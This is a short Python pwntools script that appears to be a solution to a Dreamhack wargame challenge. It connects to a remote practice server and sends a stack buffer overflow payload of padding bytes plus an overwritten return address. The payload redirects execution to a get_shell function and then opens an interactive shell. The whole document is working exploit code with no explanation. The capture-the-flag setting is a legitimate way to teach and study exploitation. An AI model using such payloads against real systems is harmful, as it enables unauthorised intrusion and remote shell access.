from pwn import *

r = remote("host3.dreamhack.games",12160)
get_shell = 0x4006aa;

context.arch = "amd64"

payload = b"A"*0x30
payload += b"B"*0x8
payload += p64(get_shell)

r.sendline(payload)
r.interactive()
